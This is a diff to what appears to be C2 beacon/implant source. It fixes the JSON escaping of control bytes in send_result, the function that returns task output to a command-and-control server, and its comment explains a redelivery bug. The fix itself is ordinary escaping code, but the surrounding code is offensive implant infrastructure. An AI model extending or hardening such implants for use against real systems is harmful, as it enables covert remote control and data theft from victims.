@@ -1364,15 +1364,28 @@ inline std::string checkin(const C2Config& cfg, const std::string& payload = "")
 
 // Send an encrypted result back to the C2 server.
 inline bool send_result(const C2Config& cfg, const std::string& task_id, const std::string& output) {
-    // Escape the output for JSON
+    // Escape the output for JSON. Control bytes MUST become \u00XX: a raw
+    // 0x01..0x1F byte is not legal inside a JSON string, so the server's
+    // json.loads rejects the ENTIRE result and the task is never acked —
+    // the beacon keeps the result pending and the C2 redelivers the task
+    // for ever (observed with the corrupted "\x01\x02EX" sentinel, which
+    // carried a raw 0x01). Any binary-ish output needs this.
     std::string escaped_output;
-    for (char c : output) {
+    static const char* kHex = "0123456789abcdef";
+    for (unsigned char c : output) {
         if (c == '"') escaped_output += "\\\"";
         else if (c == '\\') escaped_output += "\\\\";
         else if (c == '\n') escaped_output += "\\n";
         else if (c == '\r') escaped_output += "\\r";
         else if (c == '\t') escaped_output += "\\t";
-        else escaped_output += c;
+        else if (c == '\b') escaped_output += "\\b";
+        else if (c == '\f') escaped_output += "\\f";
+        else if (c < 0x20) {
+            escaped_output += "\\u00";
+            escaped_output += kHex[(c >> 4) & 0xF];
+            escaped_output += kHex[c & 0xF];
+        }
+        else escaped_output += (char)c;
     }
 
     // Build JSON payload
